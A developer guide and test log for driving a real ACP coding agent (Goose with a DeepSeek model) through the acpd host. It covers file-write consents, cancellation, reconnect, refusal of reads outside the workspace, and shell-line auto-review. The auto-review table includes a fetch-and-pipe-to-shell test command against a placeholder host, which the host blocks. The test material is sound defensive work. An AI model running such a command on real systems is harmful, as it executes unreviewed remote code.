# Real-agent testing through ACPortal

This note is how to drive a real ACP agent through `acpd` the way the phone does,
and what has already been verified. It is not a claim of production readiness.

## What the check covers

[`scripts/real-agent-check.py`](../scripts/real-agent-check.py) pairs a throwaway
device, creates a session over HTTP and talks ACP over the `acpd.v1` WebSocket.
It drives these steps by default:

1. **inspect** — the agent lists and reads project files.
2. **approve** — a host `fs/write_text_file` consent is allowed; a broken test is fixed on disk.
3. **deny** — a host write consent is refused; the file stays unchanged.
4. **terminal** — the agent is asked to run the project's tests.
5. **reconnect** — the client detaches mid-prompt and reconnects with `?after=`; the host replays the rest.
6. **load** — the host session is deleted and a new one is opened with `loadSessionId`.
7. **cancel** — `session/cancel` is sent while a host write consent is outstanding; the file is not written.
8. **outside** — a path outside the workspace is refused by the host.

[`scripts/acp-stdio-tap.py`](../scripts/acp-stdio-tap.py) is optional. Put it in
front of the agent command when you need to see the raw ACP frames between host
and agent. The tap writes full payloads to `TAP_FILE` (prompts, file contents,
command lines). Keep that file local and delete it; never commit it.

## Setup used for the recorded Linux run

| Piece | Value |
| --- | --- |
| Date | 8 October 2026 (Europe/Athens) |
| Host | `acpd` on branch `host-logging-doctor-android-ci` |
| Agent | Goose 1.53.0 CLI at `/usr/lib/goose/resources/bin/goose acp` (bundled with the desktop package; the `goose` on PATH is the GUI and must not be used for ACP) |
| Model | DeepSeek `deepseek-flash` through Goose's OpenAI-compatible provider (`GOOSE_PROVIDER=openai`, `GOOSE_MODEL=deepseek-flash`, `OPENAI_HOST=https://api.deepseek.com`) |
| Credentials | Operator environment only (`OPENAI_API_KEY`). Nothing was written into Goose's own config or into the registry. |
| Mode | `GOOSE_MODE=approve` so every tool and host consent reaches the client |
| Fixture | Tiny Python calculator under an allowed workspace root: `calc.py` (buggy `add`), `test_calc.py`, `README.md` |

A private config and registry (kept outside the repo) look like this. Adjust absolute
paths. Do not put provider keys in the registry.

```toml
registry = "agents.json"
workspace_roots = ["project"]
state_directory = "state"

[server]
listen = "127.0.0.1:8799"

[runtime]
request_timeout_seconds = 180

[logging]
file = "logs/acpd.log"
frame_metadata = true
```

```json
[
  {
    "id": "goose",
    "name": "Goose",
    "command": "/usr/lib/goose/resources/bin/goose",
    "args": ["acp"],
    "transport": "stdio",
    "enabled": true,
    "env": {
      "GOOSE_MODE": "approve",
      "GOOSE_PROVIDER": "openai",
      "GOOSE_MODEL": "deepseek-flash",
      "OPENAI_HOST": "https://api.deepseek.com"
    }
  },
  {
    "id": "gemini",
    "name": "Gemini CLI",
    "command": "gemini",
    "args": ["--acp"],
    "enabled": false
  }
]
```

The built-in Gemini entry must be disabled (or present) for `doctor` and `start`
to succeed: an enabled but missing built-in fails the executable check.

## How to reproduce

1. Build the host: `cargo build --locked -p acpd`.
2. Create an empty root under an allowed workspace and write the fixture:

   ```bash
   python3 scripts/real-agent-check.py --init-fixture /abs/path/to/root/calc
   ```

3. Put `config.toml` and `agents.json` next to that root (see above). Create the
   log directory (`mkdir -p logs`); the host never creates it.
4. Install the WebSocket client used by the script:

   ```bash
   python3 -m venv .venv && .venv/bin/pip install websockets==15.0.1
   ```

5. Export the provider key into the environment of the check (never into the registry):

   ```bash
   export OPENAI_API_KEY="$(cat /path/to/key-file)"
   ```

6. Run the check. Pairing codes and bearer tokens stay in memory and are never printed.

   ```bash
   .venv/bin/python scripts/real-agent-check.py \
     --acpd target/debug/acpd \
     --config /abs/path/to/config.toml \
     --agent goose \
     --workspace /abs/path/to/root/calc \
     --capture /tmp/acp-capture.jsonl \
     --results /tmp/acp-results.json \
     --host-output /tmp/acpd-host.out
   ```

7. Optional: wrap the agent with `scripts/acp-stdio-tap.py` (see its docstring) when
   you need raw frames. Delete `TAP_FILE` afterwards.

Useful flags: `--steps inspect,approve` to run a subset; `--steps autoreview`
(not in the default list) exercises shell-line auto-review and needs
`[shell_review.<agent>] rules = true` in the host config; `--outside-file` for a
harmless path outside the workspace (default `/etc/hostname`).

## Results (8 October 2026, Linux)

One continuous run through all eight steps (the script now has nine; `kill` was added later), with the host on the branch tip that
includes the callback error-code fix. Usage numbers are the per-prompt totals
Goose reported on each response (they accumulate context, so later steps look
larger); Goose's own session record for this run shows about 2.9k output tokens
and about 109k accumulated total tokens. Rough DeepSeek cost for that session was
about \$0.0025; the day's earlier exploratory runs brought the fixture's total to
about \$0.014.

| Step | Result | Evidence |
| --- | --- | --- |
| 1. Tool use (inspect) | **pass** | Goose listed the tree and read `README.md`, `calc.py` and `test_calc.py` through agent permissions plus host `fs/read_text_file`. It correctly reported that `add` subtracts and that `test_add` should fail. |
| 2. Permission approve | **pass** | Agent `edit` was allowed, then host `Write calc.py` (`_meta.acpdSource: host-filesystem`, option `acpd-write-allow`). On disk: tests went from `FAILED (failures=1)` to `OK`; `git` showed only `calc.py` modified. |
| 3. Permission deny | **pass** | Host `Write README.md` was answered with `acpd-write-deny` (twice when Goose retried via `write`). README stayed unchanged; Goose reported the host refusal and stopped retrying after the second denial. |
| 4. Terminal | **partial (superseded below)** | At the time the host only accepted a resolved executable with literal args, so Goose's shell strings (`cd … && python3 -m unittest -v`, no `args`) were refused with `-32602`; plain argv (`pwd`, `ls`) ran through `host-terminal`. Shell lines are now supported after per-line approval; see *Shell-line terminals* below. |
| 5. Reconnect | **pass** | Client detached after the first message chunk, then reconnected with `?after=`. Replay reported `gap: false` and delivered the remaining chunks plus the final `end_turn` response. |
| 6. Session load | **pass** | After deleting the host session, `POST /v1/sessions` with `loadSessionId` returned `ready` with the same ACP session id. The new attachment replayed prior user/agent/tool history; a follow-up prompt answered `calc.py` as the file changed earlier. |
| 7. Cancel mid write | **pass** | While a host `Write CANCEL_MARKER.txt` consent was outstanding, the client sent `session/cancel` and answered the consent with `cancelled`. Prompt `stopReason` was `cancelled`; `CANCEL_MARKER.txt` was never created. The host answered the agent's pending `fs/write_text_file` with `-32800`. |
| 8. Outside-workspace read | **pass** | Goose requested `/etc/hostname`; host `fs/read_text_file` returned `-32602` with `Workspace text read denied or unavailable`. Goose reported the denial and printed no contents. |
| Cleanup | **pass** | After `DELETE /v1/sessions/:id` and host shutdown, no `goose acp` process remained under the host. |
| Frame metadata log | **pass** | With `frame_metadata = true` the 0600 log held only `direction`/`kind`/`method`/`update`/`bytes` (and `code` on errors). No prompt text, reply text, path, pairing code, bearer token or provider key. |

Doctor against the same Goose install, run separately earlier the same day, reported
`ready` (exit 0) once Gemini was disabled. See also the sign-in / frame-metadata
checkpoint in `AGENTS.md`.

## Shell-line terminals (8 October 2026, Linux, 16:55 Athens)

After shell-line support landed (consent `_meta.acpdSource: host-shell-command`,
options `acpd-shell-deny` / `acpd-shell-allow`), the script was extended: the
`terminal` step approves shell-line consents with `acpd-shell-allow` and records
the exact line shown plus the host terminal snapshots, and a new `kill` step
approves `sleep 45 && echo finished-after-sleep`, waits until the host reports
the terminal running, then sends `session/cancel`.

Command: `real-agent-check.py --steps approve,terminal,kill` on a fresh fixture
(Goose 1.53.0, `deepseek-flash`, env-only key).

| Step | Result | Evidence |
| --- | --- | --- |
| approve | **pass** | Host `Write calc.py` approved; tests went `FAILED (failures=1)` → `OK`. |
| terminal | **pass** | Goose asked its own `shell · python3 -m unittest -v` permission, then the host showed `Run shell command` with `shellLine: "python3 -m unittest -v"`, `shell: "/bin/sh -c"`, cwd = the fixture and `environmentNames: ["AGENT_SESSION_ID"]` (no values). After approval the terminal snapshot ended with `Ran 2 tests in 0.000s` / `OK` and `exitStatus: {exitCode: 0}`; Goose answered "2 tests passed … exit code 0". |
| kill | **pass** | Approved line `sleep 45 && echo finished-after-sleep`. Before cancel the host had `/bin/sh -c sleep 45 && echo finished-after-sleep` and its `sleep 45` grandchild running; after `session/cancel` both were gone (only `goose acp` remained), the tool ended `failed`, `finished-after-sleep` never appeared, prompt `stopReason: cancelled`. |
| cleanup | **pass** | After session delete and host stop no process the host had started was still running. |
| logs | **pass** | The frame-metadata log contained no `unittest`, `sleep 45` or env names. |

Goose's own store recorded about 36.5k accumulated tokens (34.7k cache-read,
528 output) for this session, so the cost was well under \$0.001 (estimated from
token counts, not a billing statement).

Not covered by this run: the Android shell-approval screen (CI builds it and runs
JVM unit tests; it was not tried on a device), Windows `cmd.exe` execution with a
real agent (the host path itself is now tested on Windows CI with the mock agent:
quoting, `&&`, redirection, exit codes, multi-line refusal and descendant
cleanup on kill), and a phone-initiated `terminal/kill`
(the phone stops a running command with session cancel).

## Shell-line auto-review (8 October 2026, Linux, 17:03 Athens)

Host config: the scratch config plus `[shell_review.goose] rules = true` and a
model reviewer (`https://api.deepseek.com`, `deepseek-flash`, `api_key_env =
"DEEPSEEK_API_KEY"`, key passed only through the environment). Command:
`real-agent-check.py --steps autoreview` (opt-in step; every host shell consent
that still reaches the "phone" is denied by the script).

| Case | Result | Evidence |
| --- | --- | --- |
| `python3 -m unittest -v` | **auto-allowed by rules** | No host consent. Tool call carried `acpdAutoReview {allow, rules, "read-only or test commands inside the workspace"}`; terminal output `Ran 2 tests … OK`, `exitCode: 0`. Goose still asked its own shell permission first. |
| `echo reviewed > NOTE.txt` | **sent to the phone** | Rules: `ask` (redirect, sensitive). Model: `ask` ("Writing a new file in the workspace can overwrite existing content, so confirm before running."). Consent `host-shell-command` with `acpdAutoReview.decision = ask`; the script denied it and `NOTE.txt` was never created. |
| `curl -s https://example.invalid/install.sh \| sh` | **denied by rules** | No consent, no model call. Goose received `Shell line refused by acpd auto-review (rules): pipes output into a shell. Do not retry it unchanged.` and reported the block without retrying. |
| `wc -l calc.py` | **auto-allowed by model** | Rules: undecided (not on the allowlist, low-risk). `deepseek-flash` returned allow ("Read-only line count of a workspace file with no side effects."); output `9 calc.py`, exit 0. |
| logs | **pass** | `logs/acpd-review.log` had four `shell line auto-review decision=… layer=…` lines and no command text, file names or URLs. |
| cleanup | **pass** | No process the host had started remained after session delete and host stop. |

Cost: Goose's store recorded about 45.2k accumulated tokens (41.3k cache-read,
1.4k output) for the session; the two reviewer calls were a few hundred tokens
each. Together with the shell-line run above, well under \$0.002 (estimated from
token counts, not a billing statement).

## Bugs found and fixed

| Issue | Status |
| --- | --- |
| Host answered refused `fs/read_text_file` / `fs/write_text_file` (and some other host failures) with JSON-RPC `-32000`. ACP reserves that code for `auth_required`, so Goose told the model "Authentication required" for a path outside the workspace. | Fixed on this branch: refusals use `-32602`, not-ready/capacity use `-32603`, cancel of a pending callback uses `-32800`. Client-facing "Agent request failed" keeps the agent's own code. Tests cover an outside read, a denied write and an agent error forwarded over the WebSocket. |

## Known limitations (not host bugs)

- **Goose shell strings.** Goose's shell tool often puts a whole shell line in
  `terminal/create.command` instead of a resolved executable plus `args`. The host
  now shows such lines as a `host-shell-command` consent and runs them through
  `/bin/sh -c` only after per-line approval. Goose also asks its own shell
  permission first, so each command needs two approvals in `approve` mode.
- **Doctor sign-in alone cannot see bad provider credentials for Goose.** Goose
  creates sessions without talking to the provider, so `doctor --agent` reports
  `ready` even with an unconfigured provider. Use `doctor --agent goose
  --workspace <dir> --prompt-check` (one small model request). On 8 October 2026
  it printed `provider responded (stopReason end_turn)` with a working DeepSeek
  key and failed with `auth_required (-32000)` when `OPENAI_API_KEY` was an
  invalid dummy value (an unconfigured provider earlier failed with `-32603`).
  Unsetting the variable did not fail, because this Goose install also had a key
  in its own stored configuration.
- **Empty Goose sessions.** Each doctor or short-lived session leaves a row in
  Goose's own session store.
- **Android phone UI.** This check drives the host API only. Instrumenting the
  Android client against a real agent remains open.
- **Broader Goose workflow.** Diff review UX, competing controllers, process death
  and physical-device TLS are not covered here.

## Cleanup

- The script stops the host and revokes the throwaway device. Confirm with
  `pgrep -af 'goose acp'` (only the desktop app's own `goose serve`, if any,
  should remain) and by reading the host log for `session created` / listening lines.
- Delete capture JSONL, results JSON, host logs and any `TAP_FILE`.
- Reset the fixture with `--init-fixture` or `git checkout -- .` inside it.
- Optional: remove leftover Goose sessions for the fixture workspace from
  Goose's own UI or session store. Do not delete unrelated sessions.

## Deterministic agent: testy

For repeatable protocol coverage without a model or provider key, `acpd/tests/testy.rs` drives the official ACP test agent (testy, rust-sdk v3.2.0) through the host. It covers echo, cancellation, every stable session update, tool calls, mode/config/auth pass-through, permission approve/deny, fs read/write, terminal create/output/wait/kill/release and elicitation (not advertised by acpd; refused cleanly). See [testy](testy.md).

## See also

- [Adding agents and Goose setup](agents.md)
- [Installation and doctor](installation.md)
- [Development log](development.md)
- [HANDOFF](../HANDOFF.md) and [AGENTS](../AGENTS.md) for the latest checkpoints
